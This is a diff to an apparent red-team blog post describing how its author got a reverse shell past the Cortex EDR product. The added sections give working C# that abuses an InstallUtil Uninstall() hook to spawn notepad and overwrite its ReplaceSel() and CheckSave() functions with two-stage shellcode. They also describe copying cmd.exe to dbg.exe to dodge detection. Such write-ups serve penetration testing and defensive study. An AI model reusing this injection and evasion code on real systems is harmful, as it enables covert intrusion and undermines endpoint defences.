@@ -358,7 +358,7 @@ This was a successful proof of concept, but it seemed incomplete until I got a r
 # More Failure
 Because the shellcode file is stored on disk, all I had to do was replace the MessageBox shellcode file with a reverse shell shellcode file. I opted to use a custom reverse shell payload instead of one from `msfvenom` for fear that it would get caught on disk. I won't go into the custom reverse shell in this document but suffice it to say it is similar in every way except for the arrangement of bytes that would cause a pattern match.
 
-After switching to the reverse shell shellcode file, I was all set to receive my reverse shell, but notepad crashed instead. From experience, I suspected that the shellcode was too long and was clobbering code beyond the `ReverseSel()` function, causing notepad to crash. For reference, the reverse shell shellcode is about twice as long as the MessageBox shellcode.
+After switching to the reverse shell shellcode file, I was all set to receive my reverse shell, but notepad crashed instead. From experience, I suspected that the shellcode was too long and was clobbering code beyond the `ReplaceSel()` function, causing notepad to crash. For reference, the reverse shell shellcode is about twice as long as the MessageBox shellcode.
 
 <br/>
 <hr/>
@@ -377,3 +377,63 @@ Using IDA, I found the offset of `CheckSave()` to be `0x3690` from the base addr
     add   rax, 0x3690                           # offset to CheckSave()
     jmp   rax                                   # jmp to CheckSave()
 ```
+
+<br/>
+<hr/>
+
+# Almost There
+After updating `Uninstall()` to use two stages, the final C# code was:
+
+```csharp
+public override void Uninstall(IDictionary savedState)
+{
+    byte[] Stage1 = File.ReadAllBytes("c:\\temp\\stage1.bin");
+    byte[] Stage2 = File.ReadAllBytes("c:\\temp\\stage2.bin");
+
+    // Spawn notepad.exe
+    Process p = new Process();
+    p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
+    p.StartInfo.CreateNoWindow = false;
+    p.Start();
+
+    // Get the base address of notepad.exe.
+    IntPtr NotepadBase = p.MainModule.BaseAddress;
+
+    // Open a handle to the process, request permissions.
+    // (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) == 0x28
+    IntPtr hProcess = OpenProcess(0x28, 0, (uint)p.Id);
+
+    bool ret = false;
+    int lpNumberOfBytesWritten = 0;
+
+    // Stage1: Address of ReplaceSel()
+    IntPtr ReplaceSel = NotepadBase + 0x157a8;
+    ret = WriteProcessMemory(hProcess, ReplaceSel, Stage1, Stage1.Length, out lpNumberOfBytesWritten);
+
+    // Stage2: Address of CheckSave()
+    IntPtr CheckSave = NotepadBase + 0x3690;
+    ret = WriteProcessMemory(hProcess, CheckSave, Stage2, Stage2.Length, out lpNumberOfBytesWritten);
+
+    // Spin here until notepad.exe exits
+    WaitForSingleObject(hProcess, 0xffffffff);
+}
+```
+
+<br/>
+<hr/>
+
+# One Last Thing
+Again ready to finally receive my reverse shell, running `installutil /u iu.exe` caused the dreaded Cortex popup. Again from experience, I suspected that Cortex was not loving the fact that `cmd.exe` was spawned with network sockets as its stdin and stdout handles.
+
+Fortunately, this was a quick fix.
+
+```
+C:\Windows\system32>copy cmd.exe dbg.exe
+        1 file(s) copied.
+```
+
+The reverse shell shellcode was updated to spawn `dbg.exe` instead of `cmd.exe`, and one last `installutil /u iu.exe` ...
+
+# Success
+![win](/images/win.png)
+<p style="text-align: center; font-size: 12px;">heyoooooo</p>
